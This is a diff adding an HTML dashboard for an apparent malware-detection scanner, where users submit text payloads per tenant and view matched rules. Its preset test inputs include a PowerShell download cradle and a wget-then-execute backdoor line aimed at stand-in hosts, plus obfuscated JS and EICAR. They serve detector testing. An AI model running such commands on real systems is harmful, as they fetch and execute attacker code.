@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>CyberUltron Scanner</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f1117;color:#e2e8f0;min-height:100vh}
+  .header{display:flex;align-items:center;justify-content:space-between;padding:1rem 2rem;background:#161b27;border-bottom:1px solid #1e2a3a}
+  .logo{display:flex;align-items:center;gap:10px}
+  .logo-icon{width:36px;height:36px;background:#1D9E75;border-radius:8px;display:flex;align-items:center;justify-content:center}
+  .logo-icon svg{width:20px;height:20px;fill:none;stroke:white;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .logo-text{font-size:17px;font-weight:600;color:#f1f5f9}
+  .logo-sub{font-size:11px;color:#64748b;margin-top:1px}
+  .status-pill{display:flex;align-items:center;gap:6px;font-size:12px;color:#1D9E75;background:rgba(29,158,117,0.1);padding:5px 12px;border-radius:20px;border:1px solid rgba(29,158,117,0.2)}
+  .dot{width:6px;height:6px;border-radius:50%;background:#1D9E75;animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+  .metrics{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;padding:1.5rem 2rem}
+  .metric{background:#161b27;border:1px solid #1e2a3a;border-radius:12px;padding:1.1rem 1.25rem}
+  .metric-label{font-size:11px;color:#64748b;text-transform:uppercase;letter-spacing:0.05em;margin-bottom:8px}
+  .metric-value{font-size:28px;font-weight:600}
+  .metric-value.green{color:#1D9E75}
+  .metric-value.red{color:#ef4444}
+  .metric-value.amber{color:#f59e0b}
+  .metric-value.blue{color:#3b82f6}
+  .main{display:grid;grid-template-columns:1fr 400px;gap:16px;padding:0 2rem 2rem}
+  .panel{background:#161b27;border:1px solid #1e2a3a;border-radius:12px;overflow:hidden}
+  .panel-header{padding:1rem 1.25rem;border-bottom:1px solid #1e2a3a;font-size:13px;font-weight:600;color:#94a3b8;text-transform:uppercase;letter-spacing:0.05em;display:flex;align-items:center;justify-content:space-between}
+  .panel-header span{font-size:12px;font-weight:400;color:#475569;text-transform:none;letter-spacing:0}
+  .submit-form{padding:1.25rem}
+  .field{margin-bottom:1rem}
+  .field label{font-size:12px;color:#64748b;display:block;margin-bottom:6px;font-weight:500}
+  .field input,.field textarea,.field select{width:100%;padding:9px 12px;font-size:13px;border:1px solid #1e2a3a;border-radius:8px;background:#0f1117;color:#e2e8f0;font-family:inherit;outline:none;transition:border-color 0.15s}
+  .field input:focus,.field textarea:focus{border-color:#1D9E75}
+  .field textarea{resize:vertical;min-height:100px;font-family:'Courier New',monospace;font-size:12px;line-height:1.6}
+  .presets{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:8px}
+  .preset-btn{font-size:11px;padding:3px 9px;border-radius:5px;border:1px solid #1e2a3a;background:#0f1117;color:#64748b;cursor:pointer;transition:all 0.15s}
+  .preset-btn:hover{color:#e2e8f0;border-color:#334155}
+  .btn{width:100%;padding:10px;font-size:13px;font-weight:600;border-radius:8px;border:1px solid #1e2a3a;background:#0f1117;color:#e2e8f0;cursor:pointer;transition:all 0.15s;margin-bottom:8px}
+  .btn:hover{background:#1e2a3a}
+  .btn.primary{background:#1D9E75;color:white;border-color:#1D9E75}
+  .btn.primary:hover{background:#0F6E56}
+  .btn.burst{border-color:#3b4e6e;color:#94a3b8}
+  .btn.burst:hover{background:#1e2a3a;color:#e2e8f0}
+  .results-list{max-height:520px;overflow-y:auto}
+  .results-list::-webkit-scrollbar{width:4px}
+  .results-list::-webkit-scrollbar-track{background:transparent}
+  .results-list::-webkit-scrollbar-thumb{background:#1e2a3a;border-radius:2px}
+  .result-item{padding:1rem 1.25rem;border-bottom:1px solid #1a2234;display:flex;align-items:flex-start;gap:12px;transition:background 0.1s}
+  .result-item:hover{background:#1a2234}
+  .result-item:last-child{border-bottom:none}
+  .ri-icon{width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:15px;font-weight:700}
+  .ri-icon.clean{background:rgba(29,158,117,0.15);color:#1D9E75}
+  .ri-icon.matched{background:rgba(239,68,68,0.15);color:#ef4444}
+  .ri-icon.pending{background:rgba(245,158,11,0.15);color:#f59e0b}
+  .ri-icon.error{background:rgba(100,116,139,0.15);color:#64748b}
+  .ri-body{flex:1;min-width:0}
+  .ri-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
+  .ri-tenant{font-size:13px;font-weight:600;color:#f1f5f9}
+  .ri-payload{font-size:11px;color:#475569;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:'Courier New',monospace}
+  .ri-rules{display:flex;flex-wrap:wrap;gap:4px;margin-top:5px}
+  .rule-tag{font-size:10px;padding:2px 7px;border-radius:4px;background:rgba(239,68,68,0.12);color:#ef4444;font-family:'Courier New',monospace;border:1px solid rgba(239,68,68,0.2)}
+  .ri-meta{margin-top:4px;font-size:11px;color:#334155}
+  .badge{font-size:11px;padding:2px 9px;border-radius:10px;font-weight:600}
+  .badge.clean{background:rgba(29,158,117,0.15);color:#1D9E75}
+  .badge.matched{background:rgba(239,68,68,0.15);color:#ef4444}
+  .badge.pending{background:rgba(245,158,11,0.15);color:#f59e0b}
+  .badge.error{background:rgba(100,116,139,0.15);color:#64748b}
+  .empty{padding:3rem;text-align:center;color:#334155;font-size:13px;line-height:1.8}
+  .empty-icon{font-size:32px;margin-bottom:8px;opacity:0.4}
+  .divider{font-size:11px;color:#334155;margin:0.5rem 0 0.75rem;text-align:center;display:flex;align-items:center;gap:8px}
+  .divider::before,.divider::after{content:'';flex:1;height:1px;background:#1e2a3a}
+  .toast{position:fixed;bottom:24px;right:24px;background:#1D9E75;color:white;padding:10px 16px;border-radius:8px;font-size:13px;font-weight:500;opacity:0;transition:opacity 0.3s;pointer-events:none;z-index:999}
+  .toast.show{opacity:1}
+  .toast.error{background:#ef4444}
+  .filter-bar{display:flex;gap:6px;padding:10px 1.25rem;border-bottom:1px solid #1a2234}
+  .filter-btn{font-size:11px;padding:3px 10px;border-radius:6px;border:1px solid #1e2a3a;background:transparent;color:#64748b;cursor:pointer;transition:all 0.15s}
+  .filter-btn.active{background:#1e2a3a;color:#e2e8f0;border-color:#334155}
+  .spinning{animation:spin 1s linear infinite;display:inline-block}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">
+    <div class="logo-icon">
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+    </div>
+    <div>
+      <div class="logo-text">CyberUltron Scanner</div>
+      <div class="logo-sub">Malware Detection Pipeline</div>
+    </div>
+  </div>
+  <div class="status-pill"><div class="dot"></div>All systems operational</div>
+</div>
+
+<div class="metrics">
+  <div class="metric"><div class="metric-label">Total scans</div><div class="metric-value blue" id="m-total">0</div></div>
+  <div class="metric"><div class="metric-label">Clean</div><div class="metric-value green" id="m-clean">0</div></div>
+  <div class="metric"><div class="metric-label">Threats detected</div><div class="metric-value red" id="m-matched">0</div></div>
+  <div class="metric"><div class="metric-label">Pending</div><div class="metric-value amber" id="m-pending">0</div></div>
+</div>
+
+<div class="main">
+  <div class="panel">
+    <div class="panel-header">
+      Scan results
+      <span id="result-count">0 results</span>
+    </div>
+    <div class="filter-bar">
+      <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
+      <button class="filter-btn" onclick="setFilter('clean',this)">Clean</button>
+      <button class="filter-btn" onclick="setFilter('matched',this)">Threats</button>
+      <button class="filter-btn" onclick="setFilter('pending',this)">Pending</button>
+    </div>
+    <div class="results-list" id="results-list">
+      <div class="empty">
+        <div class="empty-icon">&#9632;</div>
+        No scans yet — submit a payload to get started
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header">Submit payload</div>
+    <div class="submit-form">
+      <div class="field">
+        <label>Tenant ID</label>
+        <input type="text" id="tenant-input" placeholder="e.g. acme_corp" value="tenant_001"/>
+      </div>
+      <div class="field">
+        <label>Payload — quick presets</label>
+        <div class="presets">
+          <button class="preset-btn" onclick="setPreset('clean')">Clean</button>
+          <button class="preset-btn" onclick="setPreset('powershell')">PowerShell</button>
+          <button class="preset-btn" onclick="setPreset('js')">Obfuscated JS</button>
+          <button class="preset-btn" onclick="setPreset('eicar')">EICAR</button>
+          <button class="preset-btn" onclick="setPreset('network')">Network IOC</button>
+        </div>
+        <textarea id="payload-input" placeholder="Enter text to scan...">Hello world, this is a clean payload.</textarea>
+      </div>
+      <button class="btn primary" onclick="submitScan()">&#9654; Scan payload</button>
+      <div class="divider">multi-tenant burst test</div>
+      <button class="btn burst" onclick="runBurst()">Fire 5 tenants simultaneously</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const presets = {
+    clean: 'Hello world, this is a completely clean payload with no threats.',
+    powershell: 'IEX (New-Object Net.WebClient).DownloadString("http://evil.example/payload")',
+    js: 'eval(unescape("%66%75%6E%63%74%69%6F%6E"))fromCharCode(72,101,108,108,111)',
+    eicar: 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
+    network: 'wget http://malicious.site/backdoor && /bin/sh backdoor'
+  };
+
+  let scans = [];
+  let activeFilter = 'all';
+
+  function setPreset(k){ document.getElementById('payload-input').value = presets[k]; }
+
+  function setFilter(f, el){
+    activeFilter = f;
+    document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+    el.classList.add('active');
+    renderResults();
+  }
+
+  function showToast(msg, isError){
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast show' + (isError?' error':'');
+    setTimeout(()=>t.className='toast', 2800);
+  }
+
+  function timeAgo(iso){
+    const s = Math.floor((Date.now()-new Date(iso))/1000);
+    if(s<5) return 'just now';
+    if(s<60) return s+'s ago';
+    if(s<3600) return Math.floor(s/60)+'m ago';
+    return Math.floor(s/3600)+'h ago';
+  }
+
+  function statusIcon(s){
+    if(s==='clean') return '✓';
+    if(s==='matched') return '!';
+    if(s==='pending') return '~';
+    return '?';
+  }
+
+  function renderResults(){
+    const list = document.getElementById('results-list');
+    let filtered = activeFilter==='all' ? scans : scans.filter(s=>s.status===activeFilter);
+    if(!filtered.length){
+      list.innerHTML='<div class="empty"><div class="empty-icon">&#9632;</div>'+(scans.length?'No results for this filter':'No scans yet — submit a payload to get started')+'</div>';
+      return;
+    }
+    list.innerHTML = filtered.slice().reverse().map(s=>`
+      <div class="result-item">
+        <div class="ri-icon ${s.status}">${statusIcon(s.status)}</div>
+        <div class="ri-body">
+          <div class="ri-top">
+            <span class="ri-tenant">${s.tenant_id}</span>
+            <span class="badge ${s.status}">${s.status}</span>
+          </div>
+          <div class="ri-payload">${s.payload_text.substring(0,70)}${s.payload_text.length>70?'...':''}</div>
+          ${s.matched_rules&&s.matched_rules.length?`<div class="ri-rules">${s.matched_rules.map(r=>`<span class="rule-tag">${r}</span>`).join('')}</div>`:''}
+          <div class="ri-meta">#${s.scan_result_id} · ${timeAgo(s.created_at||new Date().toISOString())}</div>
+        </div>
+      </div>
+    `).join('');
+    updateMetrics();
+    document.getElementById('result-count').textContent = scans.length+' result'+(scans.length!==1?'s':'');
+  }
+
+  function updateMetrics(){
+    document.getElementById('m-total').textContent = scans.length;
+    document.getElementById('m-clean').textContent = scans.filter(s=>s.status==='clean').length;
+    document.getElementById('m-matched').textContent = scans.filter(s=>s.status==='matched').length;
+    document.getElementById('m-pending').textContent = scans.filter(s=>s.status==='pending').length;
+  }
+
+  async function pollScan(id, payloadText, createdAt){
+    for(let i=0;i<20;i++){
+      await new Promise(r=>setTimeout(r,1500));
+      try{
+        const res = await fetch(`/scan/${id}`);
+        if(!res.ok) continue;
+        const data = await res.json();
+        const idx = scans.findIndex(s=>s.scan_result_id===id);
+        if(idx>=0){
+          scans[idx]={...data,payload_text:payloadText,created_at:createdAt};
+          renderResults();
+          if(data.status!=='pending') return;
+        }
+      }catch(e){}
+    }
+  }
+
+  async function submitScan(tenantId, payloadText){
+    const tid = tenantId||document.getElementById('tenant-input').value.trim();
+    const pt = payloadText||document.getElementById('payload-input').value.trim();
+    if(!tid||!pt){ showToast('Fill in tenant ID and payload', true); return; }
+    try{
+      const res = await fetch('/scan',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({tenant_id:tid,payload_text:pt})
+      });
+      if(!res.ok){ showToast('API error: '+res.status, true); return; }
+      const data = await res.json();
+      const now = new Date().toISOString();
+      scans.push({...data,payload_text:pt,matched_rules:[],created_at:now});
+      renderResults();
+      showToast('Scan #'+data.scan_result_id+' enqueued');
+      pollScan(data.scan_result_id, pt, now);
+    }catch(e){
+      showToast('Cannot reach API', true);
+    }
+  }
+
+  async function runBurst(){
+    const tenants=['tenant_001','tenant_002','tenant_003','tenant_004','tenant_005'];
+    const payloads=[presets.clean,presets.powershell,presets.js,presets.eicar,presets.network];
+    showToast('Firing 5 concurrent tenant scans...');
+    await Promise.all(tenants.map((t,i)=>submitScan(t,payloads[i])));
+  }
+
+  renderResults();
+</script>
+</body>
+</html>
